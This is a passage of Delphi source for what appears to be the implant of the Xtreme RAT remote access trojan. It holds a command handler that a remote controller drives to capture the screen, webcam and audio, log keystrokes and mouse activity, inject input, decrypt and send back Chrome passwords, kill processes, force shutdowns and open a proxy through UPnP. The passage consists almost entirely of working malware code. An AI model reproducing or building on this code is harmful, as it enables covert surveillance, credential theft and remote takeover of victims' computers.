                               TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = LISTARPORTASDNS then
  begin
    ReadTCPTable;
    ReadUdpTable;

    TempStr := CriarLista(true);
    GlobalVars.MainIdTCPClient.EnviarString(LISTARPORTAS + '|' +
                               LISTADEPORTASPRONTA + '|' +
                               TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FINALIZARCONEXAO then
  begin
    ReadTCPTable;
    ReadUdpTable;

    delete(Recebido, 1, posex('|', Recebido));
    tempstr := copy(Recebido, 1, posex('|', Recebido) - 1);

    delete(Recebido, 1, posex('|', Recebido));
    tempstr1 := copy(Recebido, 1, posex('|', Recebido) - 1);

    delete(Recebido, 1, posex('|', Recebido));
    tempstr2 := copy(Recebido, 1, posex('|', Recebido) - 1);

    delete(Recebido, 1, posex('|', Recebido));
    tempstr3 := copy(Recebido, 1, posex('|', Recebido) - 1);

    if CloseTcpConnect(tempstr, tempstr2, strtoint(tempstr1), strtoint(tempstr3)) = true then
    GlobalVars.MainIdTCPClient.EnviarString(LISTARPORTAS + '|' +
                               FINALIZARCONEXAO + '|' +
                               tempstr + '|' +
                               tempstr2 + '|' +
                               'T' + '|') else
    GlobalVars.MainIdTCPClient.EnviarString(LISTARPORTAS + '|' +
                               FINALIZARCONEXAO + '|' +
                               tempstr + '|' +
                               tempstr2 + '|' +
                               'F' + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FINALIZARPROCESSOPORTAS then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if KillProc(TempInt) = true then
    GlobalVars.MainIdTCPClient.EnviarString(LISTARPORTAS + '|' +
                               FINALIZARPROCESSOPORTAS + '|' +
                               'Y|' +
                               inttostr(TempInt) + '|') else
    GlobalVars.MainIdTCPClient.EnviarString(LISTARPORTAS + '|' +
                               FINALIZARPROCESSOPORTAS + '|' +
                               'N|' +
                               inttostr(TempInt) + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADEPROGRAMAS then
  begin
    ToSend := ListarProgramasInstalados;
    GlobalVars.MainIdTCPClient.EnviarString(PROGRAMAS + '|' +
                               LISTADEPROGRAMAS + '|' +
                               ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESINSTALARPROGRAMA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Recebido;
    ShellExecute(0,
                  'open',
                  pWideChar(TempStr),
                  '',
                  '',
                  SW_SHOWNORMAL);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESINSTALARPROGRAMASILENT then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));
    ShellExecute(0,
                  'open',
                  pWideChar(TempStr),
                  pWideChar(recebido),
                  '',
                  SW_SHOWNORMAL);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMESSAGE then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));

    TempInt1 := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));

    TempStr := copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr1 := Recebido;

    MyMessage := TMessageBox.Create(MainIdTCPClient.Host,
                                    MainIdTCPClient.Port,
                                    TempStr,
                                    TempStr1,
                                    TempInt,
                                    TempInt1);
    MyMessage.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FSHUTDOWN then
  begin
    WindowsExit(EWX_SHUTDOWN or EWX_FORCE);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FHIBERNAR then
  begin
    Hibernar(True, False, False);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FLOGOFF then
  begin
    WindowsExit(EWX_LOGOFF or EWX_FORCE);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = POWEROFF then
  begin
    WindowsExit(EWX_POWEROFF or EWX_FORCE);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FRESTART then
  begin
    WindowsExit(EWX_REBOOT or EWX_FORCE);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FDESLMONITOR then
  begin
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 0);
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 1);
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = BTN_START_HIDE then
  begin
    ShowStartButton(false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = BTN_START_SHOW then
  begin
    ShowStartButton(true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = BTN_START_BLOCK then
  begin
    EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil),0, 'Button', nil),false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = BTN_START_UNBLOCK then
  begin
    EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil),0, 'Button', nil),true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESK_ICO_HIDE then
  begin
    ShowDesktop(false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESK_ICO_SHOW then
  begin
    ShowDesktop(true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESK_ICO_BLOCK then
  begin
    EnableWindow(FindWindow('ProgMan', nil), false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESK_ICO_UNBLOCK then
  begin
    EnableWindow(FindWindow('ProgMan', nil), true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = TASK_BAR_HIDE then
  begin
    TaskBarHIDE(false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = TASK_BAR_SHOW then
  begin
    TaskBarHIDE(true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = TASK_BAR_BLOCK then
  begin
    EnableWindow(FindWindow('Shell_TrayWnd', nil), false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = TASK_BAR_UNBLOCK then
  begin
    EnableWindow(FindWindow('Shell_TrayWnd', nil), true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSE_BLOCK then
  begin
    PostMessage(ServerObject.Handle, WM_MOUSESTOP, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSE_UNBLOCK then
  begin
    PostMessage(ServerObject.Handle, WM_MOUSESTART, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSE_SWAP then
  begin
    if swapmouse = true then
    begin
      SwapMouseButtons(false);
      swapmouse := false;
    end else
    begin
      SwapMouseButtons(true);
      swapmouse := true;
    end;
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = SYSTRAY_ICO_HIDE then
  begin
    TrayHIDE;
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = SYSTRAY_ICO_SHOW then
  begin
    TraySHOW;
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = OPENCD then
  begin
    AbrirCD;
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = CLOSECD then
  begin
    FecharCD;
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESKTOP then
  begin
    DC := GetDC(GetDesktopWindow);
    TempInt := GetDeviceCaps(DC, HORZRES);
    TempInt1 := GetDeviceCaps(DC, VERTRES);
    ReleaseDC(GetDesktopWindow, DC);
    DesktopThread := TNewConnectionThread.Create(MainIdTCPClient.Host,
                                                 MainIdTCPClient.Port,
                                                 unitconstantes.NEWCONNECTION + '|' +
                                                 ConnectionID +
                                                 DelimitadorComandos +
                                                 DESKTOPNEW + '|' +
                                                 STARTDESKTOP + '|' +
                                                 IntToStr(TempInt) + '|' +
                                                 intToStr(TempInt1) + '|',
                                                 False);
    DesktopThread.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESKTOPCONFIG then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    DesktopQuality := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    DesktopX := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    DesktopY := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    DesktopInterval := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESKTOPPREVIEW then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    DesktopQuality := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    DesktopX := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    DesktopY := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    DesktopInterval := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    TempStr := GetDesktopImage(DesktopQuality, DesktopX, DesktopY);
    GlobalVars.MainIdTCPClient.EnviarString(DESKTOP + '|' + DESKTOPPREVIEW + '|' + TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = TECLADOEXECUTAR then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    while Recebido <> '' do
    begin
      ZeroMemory(@k, SizeOf(Tkeys));
      Move(Recebido[1], k, SizeOf(TKeys));
      delete(Recebido, 1, sizeof(tkeys));
      PostKeyEx32(k.key, k.shift, false);
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSECLICK then
  begin
    Delete(Recebido, 1, posex('|', Recebido));

    Point.X := strtoint(copy(Recebido, 1, posex('|', Recebido) - 1));
    Delete(Recebido, 1, posex('|', Recebido));

    Point.Y := strtoint(copy(Recebido, 1, posex('|', Recebido) - 1));
    Delete(Recebido, 1, posex('|', Recebido));

    MouseButton := strtoint(copy(Recebido, 1, posex('|', Recebido) - 1));
    Delete(Recebido, 1, posex('|', Recebido));

    //ClientToScreen(strtoint(copy(Recebido, 1, posex('|', Recebido) - 1)), Point);
    ClientToScreen(GetDesktopWindow, Point);

    Delete(Recebido, 1, posex('|', Recebido));

    DC := GetDC(GetDesktopWindow);
    Point.X := Round(Point.X * (65535 / GetDeviceCaps(DC, 8)));
    Point.Y := Round(Point.Y * (65535 / GetDeviceCaps(DC, 10)));
    ReleaseDC(GetDesktopWindow, DC);

    mouse_event(MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE, Point.X, Point.Y, 0, 0);
    mouse_event(MouseButton, 0, 0, 0, 0);

    Point.X := strtoint(copy(Recebido, 1, posex('|', Recebido) - 1));
    Delete(Recebido, 1, posex('|', Recebido));

    Point.Y := strtoint(copy(Recebido, 1, posex('|', Recebido) - 1));
    Delete(Recebido, 1, posex('|', Recebido));

    MouseButton := strtoint(copy(Recebido, 1, posex('|', Recebido) - 1));
    Delete(Recebido, 1, posex('|', Recebido));

    delay := strtoint(copy(Recebido, 1, posex('|', Recebido) - 1));
    sleep(delay);

    DC := GetDC(GetDesktopWindow);
    Point.X := Round(Point.X * (65535 / GetDeviceCaps(DC, 8)));
    Point.Y := Round(Point.Y * (65535 / GetDeviceCaps(DC, 10)));
    ReleaseDC(GetDesktopWindow, DC);

    mouse_event(MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE, Point.X, Point.Y, 0, 0);
    mouse_event(MouseButton, 0, 0, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESKTOPMOVEMOUSE then
  begin
    Delete(Recebido, 1, posex('|', Recebido));

    Point.X := strtoint(copy(Recebido, 1, posex('|', Recebido) - 1));
    Delete(Recebido, 1, posex('|', Recebido));

    Point.Y := strtoint(copy(Recebido, 1, posex('|', Recebido) - 1));
    Delete(Recebido, 1, posex('|', Recebido));

    ClientToScreen(GetDesktopWindow, Point);

    DC := GetDC(GetDesktopWindow);
    Point.X := Round(Point.X * (65535 / GetDeviceCaps(DC, 8)));
    Point.Y := Round(Point.Y * (65535 / GetDeviceCaps(DC, 10)));
    ReleaseDC(GetDesktopWindow, DC);

    mouse_event(MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE, Point.X, Point.Y, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = WEBCAM then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    if Recebido <> '' then SelectedWebcam := StrToInt(recebido) else SelectedWebcam := 0;
    PostMessage(ServerObject.Handle, WM_WEBCAMSTART, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = WEBCAMCONFIG then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    try
      WebcamQuality := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      WebcamQuality := 50;
    end;
    Delete(Recebido, 1, posex('|', Recebido));
    try
      WebcamInterval := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      WebcamInterval := 0;
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = STARTAUDIO then
  begin
    AudioThread := TNewConnectionThread.Create(MainIdTCPClient.Host,
                                               MainIdTCPClient.Port,
                                               unitconstantes.NEWCONNECTION + '|' +
                                               ConnectionID +
                                               DelimitadorComandos +
                                               AUDIO + '|' +
                                               STARTAUDIO + '|',
                                               False);
    AudioThread.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = CHAT then
  begin
    delete(recebido, 1, posex('|', recebido));
    unitChat.ServerName := Copy(recebido, 1, posex(DelimitadorComandos, recebido) - 1);
    delete(recebido, 1, posex(DelimitadorComandos, recebido) - 1);
    delete(recebido, 1, Length(DelimitadorComandos));
    unitChat.ClientName := Copy(recebido, 1, posex(DelimitadorComandos, recebido) - 1);;
    delete(recebido, 1, posex(DelimitadorComandos, recebido) - 1);
    delete(recebido, 1, Length(DelimitadorComandos));

    UnitChat.FormChat.Form.Visible := True;
    UnitChat.FormChat.Form.Caption := Recebido;

    GlobalVars.MainIdTCPClient.EnviarString(CHAT + '|' + CHATSTART + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = CHATSTOP then
  begin
    if UnitChat.FormChat.Form.Visible = False then exit;
    UnitChat.FormChat.Form.Visible := False;
    GlobalVars.MainIdTCPClient.EnviarString(CHAT + '|' + CHATSTOP + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = CHATTEXT then
  begin
    delete(recebido, 1, posex('|', recebido));
    UnitChat.FormChat.Memo1.Text := UnitChat.FormChat.Memo1.Text + ShowTime + ' --- ' + unitChat.ClientName + #13#10 + Recebido + #13#10#13#10;
    UnitChat.FormChat.Memo1.SelStart := Length(UnitChat.FormChat.Memo1.Text);
    SendMessage(UnitChat.FormChat.Memo1.handle, EM_SCROLLCARET, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGER then
  begin
    TempBool := KeyObject > 0;
    if TempBool = false then
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERATIVAR + '|' + 'F' + '|') else
    begin
      if SendMessage(KeyObject, WM_CHECKKEY, 0, 0) <> WM_CHECKKEY + 1 then
      GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERATIVAR + '|' + 'F' + '|') else
      GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERATIVAR + '|' + 'T' + '|');
    end;

    if OnlineKeylogger = True then
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERONLINESTART + '|') else
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERONLINESTOP + '|');

    if kHook_mouse > 0 then
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + MOUSELOGGERSTART + '|' + MouseFolder + '|' + RelacaoJanelas) else
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + MOUSELOGGERSTOP + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGERATIVAR then
  begin
    PostMessage(ServerObject.Handle, WM_ACTIVEKEY, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGERDESATIVAR then
  begin
    PostMessage(ServerObject.Handle, WM_DEACTIVEKEY, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGERBAIXAR then
  begin
{
    if KeyObject > 0 then SendMessage(KeyObject, WM_GETLOGFILE, 0, 0) else
    begin
      GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERBAIXAR + '|');
      exit;
    end;

}
    if FileExists(KeyloggerFileName) = false then
    begin
      GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERBAIXAR + '|');
      exit;
    end;

    Randomize;
    TempStr := MyTempFolder + IntToStr(Random(999999)) + '.dat';
    CopyFileW(KeyloggerFileName, PWideChar(TempStr), False);
    SetFileAttributesW(pWideChar(TempStr), FILE_ATTRIBUTE_NORMAL);
	  TempInt := LerArquivo(pWideChar(TempStr), p);
    DeleteFileW(pWideChar(TempStr));

    if TempInt <= 0 then GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERBAIXAR + '|' + 'NOLOGS') else
    begin
      SetLength(TempStr1, TempInt div 2);
      CopyMemory(@TempStr1[1], p, TempInt);

      EnDecryptKeylogger(pWideChar(TempStr1), TempInt div 2);
      while posex(#13#10#13#10#13#10, Tempstr1) > 0 do
      TempStr1 := customStringReplace(TempStr1, #13#10#13#10#13#10, #13#10#13#10);

      VarThread := TNewConnectionThread.Create(MainIdTCPClient.Host,
                                               MainIdTCPClient.Port,
                                               unitconstantes.NEWCONNECTION + '|' +
                                               ConnectionID +
                                               DelimitadorComandos +
                                               KEYLOGGER + '|' + KEYLOGGERBAIXAR + '|',
                                               True,
                                               TempStr1);
      VarThread.Resume;
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGEREXCLUIR then
  begin
    SendMessage(KeyObject, WM_CLEARKEY, 0, 0);
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGEREXCLUIR + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGERONLINESTART then
  begin
    OnlineKeylogger := True;
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERONLINESTART + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = KEYLOGGERONLINESTOP then
  begin
    OnlineKeylogger := False;
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERONLINESTOP + '|');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSELOGGERSTART then
  begin
    delete(Recebido, 1, posex('|', recebido));
    RelacaoJanelas := Recebido;

    Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'MouseLogger', 'True');
    Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'MouseLoggerWindows', RelacaoJanelas);

    TempStr := ExtractFilePath(InstalledServer) + 'MouseCap\';
    if ForceDirectories(pWideChar(TempStr)) = False then TempStr := ExtractFilePath(InstalledServer) else
    HideFileName(TempStr);
    MouseFolder := TempStr;

    SendMessage(ServerObject.Handle, WM_MOUSELOGGERSTART, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSELOGGERSTOP then
  begin
    Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'MouseLogger', 'False');
    SendMessage(ServerObject.Handle, WM_MOUSELOGGERSTOP, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSELOGGERSTARTSEND then
  begin
    NewEnviarMouse := TNewEnviarMouse.Create(MainIdTCPClient.Host, MainIdTCPClient.Port);
    NewEnviarMouse.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MOUSELOGGERDELETE then
  begin
    delete(Recebido, 1, posex('|', recebido));
    while posex(#13#10, recebido) > 0 do
    begin
      DeleteFileW(pWideChar(Copy(Recebido, 1, posex(#13#10, recebido) - 1)));
      delete(recebido, 1, posex(#13#10, Recebido) + 1);
    end;
  end else
  
  if copy(Recebido, 1, posex('|', Recebido) - 1) = GETPASSWORDS then
  begin
    Password := TPassword.Create(MainIdTCPClient.Host, MainIdTCPClient.Port);
    Password.Resume;
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = CHROMEPASS then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));

    TempStream := TMemoryStream.Create;
    TempStream.Write(Recebido[1], Length(Recebido) * 2);
    TempStream.Position := 0;

    Giren.pbData := TempStream.Memory;
    Giren.cbData := TempStream.Size;
    CryptUnProtectData(@Giren, nil,nil,nil,nil,0,@Cikan);

    SetString(TempStrAnsi, PAnsiChar(Cikan.pbData), Cikan.cbData);
    TempStr := TempStrAnsi;

    TempStream.Free;
    GlobalVars.MainIdTCPClient.EnviarString(CHROMEPASS + '|' + IntToStr(TempInt) + '|' + TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = KEYSEARCH then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    Randomize;

    TempStr1 := MyTempFolder + IntToStr(Random(999999)) + '.dat';
    CopyFileW(KeyloggerFileName, PWideChar(TempStr1), False);

    SetFileAttributesW(pWideChar(TempStr1), FILE_ATTRIBUTE_NORMAL);
	  TempInt := LerArquivo(pWideChar(TempStr1), p);
    DeleteFileW(pWideChar(TempStr1));

    if TempInt <= 0 then GlobalVars.MainIdTCPClient.EnviarString(KEYSEARCH + '|' + 'NO') else
    begin
      SetLength(TempStr, TempInt div 2);
      CopyMemory(@TempStr[1], p, TempInt);

      EnDecryptKeylogger(@TempStr[1], TempInt div 2);
      TempStr := customStringReplace(TempStr, #0, '');

      if posex(WideUpperCase(Recebido), WideUpperCase(TempStr)) > 0 then
      GlobalVars.MainIdTCPClient.EnviarString(KEYSEARCH + '|' + 'YES') else
      GlobalVars.MainIdTCPClient.EnviarString(KEYSEARCH + '|' + 'NO');
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = UnitConstantes.FILESEARCH then
  begin
    StopFileExistsComputer := True;
    Delete(Recebido, 1, posex('|', Recebido));
    sleep(5000);

    StopFileExistsComputer := False;
    FileExistsComputer := TFileExistsComputer.Create(MainIdTCPClient.Host, MainIdTCPClient.Port, Recebido);
    FileExistsComputer.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = GETSERVERSETTINGS then
  begin
    TempStr := '';
    Config := TMemoryStream.Create;
    Config.Write(ConfiguracoesServidor, SizeOf(TConfiguracoes));

    SetLength(TempStr1, Config.size);
    Config.Position := 0;
    Config.Read(pointer(TempStr1)^, Config.Size);
    Config.Free;

    TempStr := TempStr1 + InstalledServer + DelimitadorComandos;
    TempStr := TempStr + ParamStr(0) + DelimitadorComandos;
    TempStr := TempStr + ServerStarted + DelimitadorComandos;

    GlobalVars.MainIdTCPClient.EnviarString(SERVERSETTINGS + '|' +
                                         GETSERVERSETTINGS + '|' +
                                         TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = PROXYSTART then
  begin
    delete(Recebido, 1, posex('|', recebido));
    LittleInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', recebido));

    if recebido = 'T' then
    begin
      AddUPnPEntry(MainIdTCPClient.Socket.Binding.IP, LittleInt, 'XtremeProxy');
    end;

    SendMessage(ServerObject.Handle, WM_PROXYSTART, LittleInt, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = PROXYSTOP then
  begin
    SendMessage(ServerObject.Handle, WM_PROXYSTOP, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = GETMSNSTATUS then
  begin
    PostMessage(ServerObject.Handle, WM_GETMSNSTATUS, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = EXITMSN then
  begin
    PostMessage(ServerObject.Handle, WM_EXITMSN, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = SETMSNSTATUS then
  begin
    delete(Recebido, 1, posex('|', recebido));
    PostMessage(ServerObject.Handle, WM_SETMSNSTATUS, StrToInt(recebido), 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MSNCONTACTLIST then
  begin
    PostMessage(ServerObject.Handle, WM_MSNCONTACTLIST, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MSNADDCONTACT then
  begin
    delete(Recebido, 1, posex('|', recebido));
    LittleInt := Length(Recebido) * 2;
    GetMem(p, LittleInt);
    CopyMemory(p, @Recebido[1], LittleInt);
    SendMessage(ServerObject.Handle, WM_MSNADDCONTACT, LittleInt, integer(p));
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MSNDELCONTACT then
  begin
    delete(Recebido, 1, posex('|', recebido));
    LittleInt := Length(Recebido) * 2;
    GetMem(p, LittleInt);
    CopyMemory(p, @Recebido[1], LittleInt);
    SendMessage(ServerObject.Handle, WM_MSNDELCONTACT, LittleInt, integer(p));
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MSNBLOCKCONTACT then
  begin
    delete(Recebido, 1, posex('|', recebido));
    LittleInt := Length(Recebido) * 2;
    GetMem(p, LittleInt);
    CopyMemory(p, @Recebido[1], LittleInt);
    SendMessage(ServerObject.Handle, WM_MSNBLOCKCONTACT, LittleInt, integer(p));
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MSNUNBLOCKCONTACT then
  begin
    delete(Recebido, 1, posex('|', recebido));
    LittleInt := Length(Recebido) * 2;
    GetMem(p, LittleInt);
    CopyMemory(p, @Recebido[1], LittleInt);
    SendMessage(ServerObject.Handle, WM_MSNUNBLOCKCONTACT, LittleInt, integer(p));
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = DESATIVAR then
  begin
    CreateMutexW(nil, False, ConfiguracoesServidor.MutexSair);
    sleep(5000); // tempo de intervalo do persist
    ExitProcess(0);
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = RESTARTSERVER then
  begin
    CreateMutexW(nil, False, ConfiguracoesServidor.MutexSair);
